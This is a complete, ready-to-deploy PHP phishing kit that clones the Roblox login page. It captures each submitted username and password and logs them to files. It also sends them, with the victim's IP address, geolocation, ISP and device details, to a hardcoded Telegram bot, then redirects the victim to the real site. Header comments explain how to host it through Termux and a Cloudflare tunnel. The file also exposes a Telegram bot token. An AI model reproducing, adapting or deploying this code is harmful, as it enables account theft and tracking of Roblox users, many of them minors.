<?php
/**
 * rob.php — Roblox login capture, single-file deployment.
 * PHP 7.4+ / Termux / Apache / nginx+fpm / PHP built-in server.
 *
 * Termux run:
 *   php -S 0.0.0.0:8080 rob.php
 *   cloudflared tunnel --url http://localhost:8080
 */

declare(strict_types=1);

// =========================================================================
// CONFIG — عدّل هذا القسم فقط
// =========================================================================
const TELEGRAM_TOKEN = '8994616920:AAHPzYvSj5JpMjlzPzaFOYMTl12PhX_ahWc';       // أو getenv('TG_TOKEN')
const TELEGRAM_CHAT  = '6045243196';        // أو getenv('TG_CHAT')
const HITS_DIR       = __DIR__ . '/hits';
const RATE_DIR       = __DIR__ . '/ratelimit';
const MAX_BODY       = 10240;
const RATE_WINDOW    = 60;
const RATE_LIMIT     = 20;
const REDIRECT_URL   = 'https://www.roblox.com/login';
const CSRF_TOKEN     = 'b3f9c1a7e2d44c9a';
const GEO_API        = 'http://ip-api.com/json/%s?fields=status,country,countryCode,regionName,city,isp,org,as,timezone,query';

// =========================================================================
// BOOTSTRAP
// =========================================================================
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('post_max_size', '12K');
@error_reporting(0);

if (!is_dir(HITS_DIR)) { @mkdir(HITS_DIR, 0755, true); }
if (!is_dir(RATE_DIR)) { @mkdir(RATE_DIR, 0755, true); }

// =========================================================================
// ASSETS — صور وأيقونات SVG مضمنة
// =========================================================================
const ASSET_LOGO = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <rect x="14" y="14" width="36" height="36" rx="4" transform="rotate(15 32 32)" fill="#00a2ff"/>
  <rect x="20" y="20" width="24" height="24" rx="3" transform="rotate(15 32 32)" fill="#0a0a0a"/>
  <rect x="27" y="27" width="10" height="10" rx="2" transform="rotate(15 32 32)" fill="#fff"/>
</svg>
SVG;

const ASSET_GRID = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40">
  <defs><pattern id="g" width="40" height="40" patternUnits="userSpaceOnUse">
    <path d="M40 0H0v40" fill="none" stroke="#e6e9eb" stroke-width="1"/>
  </pattern></defs>
  <rect width="40" height="40" fill="url(#g)"/>
</svg>
SVG;

const ASSET_BLOB = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <defs>
    <radialGradient id="rg" cx="50%" cy="50%" r="50%">
      <stop offset="0%" stop-color="#00a2ff" stop-opacity=".18"/>
      <stop offset="100%" stop-color="#00a2ff" stop-opacity="0"/>
    </radialGradient>
  </defs>
  <circle cx="100" cy="100" r="100" fill="url(#rg)"/>
</svg>
SVG;

const ASSET_USER = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#8a8f94" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
  <circle cx="12" cy="7" r="4"/>
</svg>
SVG;

const ASSET_LOCK = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#8a8f94" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
  <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
</svg>
SVG;

// =========================================================================
// HELPERS
// =========================================================================
function client_ip(): string {
    $xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
    if ($xff !== '') {
        $first = trim(explode(',', $xff)[0]);
        if (filter_var($first, FILTER_VALIDATE_IP)) { return $first; }
    }
    $cf = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? '';
    if ($cf !== '' && filter_var($cf, FILTER_VALIDATE_IP)) { return $cf; }
    $ra = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return filter_var($ra, FILTER_VALIDATE_IP) ?: '0.0.0.0';
}

function rate_ok(string $ip): bool {
    $file = RATE_DIR . '/' . hash('sha256', $ip) . '.rl';
    $now  = time();
    $bucket = [];
    if (is_file($file)) {
        $raw = @file_get_contents($file);
        if ($raw !== false) {
            foreach (explode(',', $raw) as $t) {
                $t = (int)$t;
                if ($t > 0 && ($now - $t) < RATE_WINDOW) { $bucket[] = $t; }
            }
        }
    }
    if (count($bucket) >= RATE_LIMIT) { return false; }
    $bucket[] = $now;
    @file_put_contents($file, implode(',', $bucket), LOCK_EX);
    return true;
}

function sanitize(string $v, int $max = 256): string {
    $v = preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '';
    return mb_substr(trim($v), 0, $max);
}

function site_url(): string {
    $scheme = 'http';
    $proto = $_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '';
    if ($proto !== '') { $scheme = strtolower(explode(',', $proto)[0]); }
    elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $scheme = 'https'; }
    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
    return $scheme . '://' . $host;
}

function device_info(string $ua): array {
    $ua_l = strtolower($ua);
    $device  = 'Desktop';
    $os      = 'Unknown';
    $browser = 'Unknown';

    // OS
    if (strpos($ua_l, 'android') !== false)        { $os = 'Android'; }
    elseif (strpos($ua_l, 'iphone') !== false)     { $os = 'iOS'; }
    elseif (strpos($ua_l, 'ipad') !== false)       { $os = 'iPadOS'; }
    elseif (strpos($ua_l, 'windows') !== false)    { $os = 'Windows'; }
    elseif (strpos($ua_l, 'mac os') !== false)     { $os = 'macOS'; }
    elseif (strpos($ua_l, 'linux') !== false)      { $os = 'Linux'; }

    // Device
    if (strpos($ua_l, 'ipad') !== false || (strpos($ua_l, 'android') !== false && strpos($ua_l, 'mobile') === false)) {
        $device = 'Tablet';
    } elseif (strpos($ua_l, 'mobile') !== false || strpos($ua_l, 'iphone') !== false || strpos($ua_l, 'android') !== false) {
        $device = 'Mobile';
    }

    // Browser
    if (strpos($ua_l, 'edg/') !== false)           { $browser = 'Edge'; }
    elseif (strpos($ua_l, 'opr/') !== false || strpos($ua_l, 'opera') !== false) { $browser = 'Opera'; }
    elseif (strpos($ua_l, 'firefox') !== false)    { $browser = 'Firefox'; }
    elseif (strpos($ua_l, 'chrome') !== false)     { $browser = 'Chrome'; }
    elseif (strpos($ua_l, 'safari') !== false)     { $browser = 'Safari'; }

    return ['device' => $device, 'os' => $os, 'browser' => $browser];
}

function geo_lookup(string $ip): array {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) { return []; }
    if (strpos($ip, '127.') === 0 || $ip === '::1') { return []; }
    $url = sprintf(GEO_API, $ip);
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 2.0,
            'header'  => "User-Agent: curl/8.0\r\n",
            'ignore_errors' => true,
        ],
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false) { return []; }
    $j = json_decode($raw, true);
    return is_array($j) ? $j : [];
}

function persist(array $record): void {
    $day   = gmdate('Ymd');
    $jsonl = HITS_DIR . "/creds_{$day}.jsonl";
    $plain = HITS_DIR . '/creds.txt';
    @file_put_contents(
        $jsonl,
        json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n",
        FILE_APPEND | LOCK_EX
    );
    @file_put_contents(
        $plain,
        $record['username'] . ':' . $record['password'] . "\n",
        FILE_APPEND | LOCK_EX
    );
}

// =========================================================================
// TELEGRAM — رسالة منسقة بأيقونات
// =========================================================================
function esc(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function build_telegram_message(array $rec): string {
    $g = $rec['geo'] ?? [];
    $country    = $g['country']     ?? '—';
    $cc         = strtoupper((string)($g['countryCode'] ?? ''));
    $region     = $g['regionName']  ?? '—';
    $city       = $g['city']        ?? '—';
    $isp        = $g['isp']         ?? '—';
    $org        = $g['org']         ?? '—';
    $tz         = $g['timezone']    ?? '—';

    $loc_line = $country;
    if ($cc !== '') { $loc_line .= " ({$cc})"; }
    $loc_line .= " • {$region} • {$city}";

    $flag = '';
    if ($cc !== '' && strlen($cc) === 2) {
        $flag = mb_convert_encoding(
            '&#' . (127397 + ord($cc[0])) . ';&#' . (127397 + ord($cc[1])) . ';',
            'UTF-8', 'HTML-ENTITIES'
        );
    }
    $flag = $cc !== '' ? html_entity_decode('&#' . (127397 + ord($cc[0])) . ';&#' . (127397 + ord($cc[1])) . ';', ENT_QUOTES, 'UTF-8') : '🌍';

    $u   = esc($rec['username']);
    $p   = esc($rec['password']);
    $ip  = esc($rec['ip']);
    $ua  = esc(mb_substr($rec['ua'], 0, 220));
    $d   = $rec['device'];
    $st  = esc($rec['site']);
    $ts  = esc($rec['ts']);

    $msg  = "🟥 <b>NEW HIT — ROBLOX</b> 🟥\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 <b>Username</b>  ➜  <code>{$u}</code>\n";
    $msg .= "🔑 <b>Password</b>  ➜  <code>{$p}</code>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "{$flag} <b>Country</b>  ➜  {$loc_line}\n";
    $msg .= "🌐 <b>IP</b>  ➜  <code>{$ip}</code>\n";
    $msg .= "🏢 <b>ISP</b>  ➜  {$isp}\n";
    $msg .= "🏛 <b>Org</b>  ➜  {$org}\n";
    $msg .= "🕐 <b>Timezone</b>  ➜  {$tz}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "📱 <b>Device</b>  ➜  {$d['device']}\n";
    $msg .= "💻 <b>OS</b>  ➜  {$d['os']}\n";
    $msg .= "🌍 <b>Browser</b>  ➜  {$d['browser']}\n";
    $msg .= "🔗 <b>Site</b>  ➜  {$st}\n";
    $msg .= "🗓 <b>Time</b>  ➜  <code>{$ts}</code>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🖥 <b>User-Agent</b>\n<code>{$ua}</code>";

    return $msg;
}

function telegram_send(string $token, string $chat, string $text): void {
    if ($token === '' || $chat === '') { return; }
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = http_build_query([
        'chat_id'                  => $chat,
        'text'                     => $text,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => 'true',
    ]);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 6,
            CURLOPT_CONNECTTIMEOUT => 4,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
        ]);
        @curl_exec($ch);
        @curl_close($ch);
        return;
    }

    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0\r\n",
            'content' => $payload,
            'timeout' => 6,
            'ignore_errors' => true,
        ],
    ]);
    @file_get_contents($url, false, $ctx);
}

// =========================================================================
// ROUTING
// =========================================================================
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$path   = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';

// Assets
if ($method === 'GET') {
    if ($path === '/assets/logo.svg')  { header('Content-Type: image/svg+xml'); echo ASSET_LOGO;  exit; }
    if ($path === '/assets/grid.svg')  { header('Content-Type: image/svg+xml'); echo ASSET_GRID;  exit; }
    if ($path === '/assets/blob.svg')  { header('Content-Type: image/svg+xml'); echo ASSET_BLOB;  exit; }
    if ($path === '/favicon.ico')      { header('Content-Type: image/svg+xml'); echo ASSET_LOGO;  exit; }
    if ($path === '/user.svg')         { header('Content-Type: image/svg+xml'); echo ASSET_USER;  exit; }
    if ($path === '/lock.svg')         { header('Content-Type: image/svg+xml'); echo ASSET_LOCK;  exit; }
}

if ($method === 'GET' && ($path === '/' || $path === '/login' || $path === '/index.php')) {
    render_login();
    exit;
}

if ($method === 'POST' && $path === '/auth/login') {
    handle_login();
    exit;
}

header('Location: ' . REDIRECT_URL, true, 302);
exit;

// =========================================================================
// HANDLERS
// =========================================================================
function handle_login(): void {
    $ip = client_ip();

    if (!rate_ok($ip)) {
        http_response_code(429);
        header('Content-Type: text/plain');
        echo 'Too Many Requests';
        exit;
    }

    $len = (int)($_SERVER['CONTENT_LENGTH'] ?? 0);
    if ($len <= 0 || $len > MAX_BODY) {
        http_response_code(413);
        header('Content-Type: text/plain');
        echo 'Payload Too Large';
        exit;
    }

    $username = sanitize((string)($_POST['username'] ?? ''));
    $password = sanitize((string)($_POST['password'] ?? ''), 512);
    $ua       = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
    $device   = device_info($ua);

    $record = [
        'ts'       => gmdate('c'),
        'site'     => site_url(),
        'ip'       => $ip,
        'ua'       => mb_substr($ua, 0, 512),
        'ref'      => mb_substr((string)($_SERVER['HTTP_REFERER'] ?? ''), 0, 512),
        'device'   => $device,
        'username' => $username,
        'password' => $password,
        'geo'      => geo_lookup($ip),
    ];

    persist($record);

    $token = TELEGRAM_TOKEN !== '' ? TELEGRAM_TOKEN : (string)getenv('TG_TOKEN');
    $chat  = TELEGRAM_CHAT  !== '' ? TELEGRAM_CHAT  : (string)getenv('TG_CHAT');

    if (($token !== '' && $chat !== '') && ($username !== '' || $password !== '')) {
        $msg = build_telegram_message($record);
        // fire-and-forget في الخلف إن أمكن
        if (function_exists('fastcgi_finish_request')) {
            ignore_user_abort(true);
        }
        telegram_send($token, $chat, $msg);
    }

    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo REDIRECT_HTML;
    exit;
}

function render_login(): void {
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');
    echo str_replace('__CSRF__', htmlspecialchars(CSRF_TOKEN, ENT_QUOTES, 'UTF-8'), LOGIN_HTML);
    exit;
}

// =========================================================================
// TEMPLATES
// =========================================================================
const LOGIN_HTML = <<<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#00a2ff">
<title>Roblox</title>
<link rel="icon" type="image/svg+xml" href="/favicon.ico">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
  font-family:"Segoe UI","Helvetica Neue",Arial,-apple-system,sans-serif;
  color:#111;background:#f2f4f5;
  background-image:url('/assets/grid.svg');
  background-size:40px 40px;
  display:flex;align-items:center;justify-content:center;
  padding:24px;min-height:100vh;position:relative;overflow-x:hidden;
}
.blob{
  position:fixed;top:-100px;right:-100px;
  width:400px;height:400px;pointer-events:none;z-index:0;
  animation:float 12s ease-in-out infinite;
}
.blob.two{top:auto;right:auto;bottom:-140px;left:-140px;animation-delay:-6s}
@keyframes float{
  0%,100%{transform:translate(0,0)}
  50%{transform:translate(30px,-20px)}
}
.card{
  position:relative;z-index:1;
  background:#fff;border-radius:8px;
  box-shadow:0 4px 24px rgba(0,0,0,.10),0 1px 3px rgba(0,0,0,.08);
  padding:44px 36px 36px;
  width:100%;max-width:420px;
}
.brand{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.brand img{width:44px;height:44px}
.brand-name{font-size:26px;font-weight:800;letter-spacing:-1.5px;font-style:italic;color:#0a0a0a}
.brand-name span{color:#00a2ff}
h1{font-size:22px;font-weight:500;text-align:center;color:#1a1a1a;margin-bottom:26px;letter-spacing:-.2px}
.field{margin-bottom:14px;position:relative}
.field label{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:500}
.field .ico{
  position:absolute;left:12px;bottom:11px;width:18px;height:18px;
  pointer-events:none;opacity:.7;
}
.field input{
  width:100%;padding:11px 13px 11px 38px;
  border:1px solid #c3c8cc;border-radius:4px;
  font-size:15px;color:#111;background:#fff;outline:none;
  transition:border-color .15s,box-shadow .15s;font-family:inherit;
}
.field input:hover{border-color:#a8adb2}
.field input:focus{border-color:#00a2ff;box-shadow:0 0 0 3px rgba(0,162,255,.15)}
.btn{
  width:100%;margin-top:20px;padding:12px;
  background:#00a2ff;color:#fff;border:0;border-radius:4px;
  font-size:15px;font-weight:600;cursor:pointer;
  transition:background .15s,transform .05s;font-family:inherit;
}
.btn:hover{background:#0090e0}
.btn:active{transform:translateY(1px)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.forgot{display:block;text-align:center;margin-top:16px;font-size:13px;color:#00a2ff;text-decoration:none;cursor:pointer}
.forgot:hover{text-decoration:underline}
.divider{display:flex;align-items:center;gap:12px;margin:22px 0;color:#999;font-size:12px}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#e0e3e6}
.alt-btn{
  display:flex;align-items:center;justify-content:center;gap:8px;
  width:100%;padding:10px;background:#fff;color:#111;border:1px solid #c3c8cc;
  border-radius:4px;text-align:center;text-decoration:none;
  font-size:14px;font-weight:500;cursor:pointer;
}
.alt-btn:hover{background:#f7f8f9}
.foot{text-align:center;margin-top:26px;font-size:11px;color:#8a8f94;line-height:1.6}
.foot a{color:#8a8f94;text-decoration:none;margin:0 6px;cursor:pointer}
.foot a:hover{text-decoration:underline;color:#555}
@media(max-width:480px){
  .card{padding:32px 22px 26px;border-radius:0;box-shadow:none;min-height:100vh}
  body{padding:0;background:#fff;background-image:none}
  .blob{display:none}
}
</style>
</head>
<body>
<img class="blob" src="/assets/blob.svg" alt="">
<img class="blob two" src="/assets/blob.svg" alt="">
<div class="card">
  <div class="brand">
    <img src="/assets/logo.svg" alt="Roblox">
    <div class="brand-name">ROB<span>LOX</span></div>
  </div>
  <h1>Log In to Roblox</h1>
  <form method="POST" action="/auth/login" id="f" autocomplete="on">
    <input type="hidden" name="csrf" value="__CSRF__">
    <div class="field">
      <label for="u">Username or Email</label>
      <img class="ico" src="/user.svg" alt="">
      <input id="u" name="username" type="text" autocomplete="username" autofocus required>
    </div>
    <div class="field">
      <label for="p">Password</label>
      <img class="ico" src="/lock.svg" alt="">
      <input id="p" name="password" type="password" autocomplete="current-password" required>
    </div>
    <button class="btn" type="submit" id="b">Log In</button>
    <a class="forgot" onclick="event.preventDefault()">Forgot Password or Username?</a>
    <div class="divider">or</div>
    <a class="alt-btn" onclick="event.preventDefault()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3 6 7 1-5 5 1 7-6-3-6 3 1-7-5-5 7-1 3-6z"/></svg>
      Sign in with a passkey
    </a>
  </form>
  <div class="foot">
    &copy; 2026 Roblox Corporation<br>
    <a onclick="event.preventDefault()">Terms</a>·
    <a onclick="event.preventDefault()">Privacy</a>·
    <a onclick="event.preventDefault()">Help</a>
  </div>
</div>
<script>
(function(){
  var f=document.getElementById('f'),b=document.getElementById('b');
  f.addEventListener('submit',function(){b.disabled=true;b.textContent='Signing in...';});
})();
</script>
</body>
</html>
HTML;

const REDIRECT_HTML = <<<'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="0;url=https://www.roblox.com/login">
<title>Redirecting...</title>
<style>html,body{height:100%}body{margin:0;background:#f2f4f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;color:#777;font-size:14px}</style>
</head><body>Redirecting to Roblox...</body></html>
HTML;
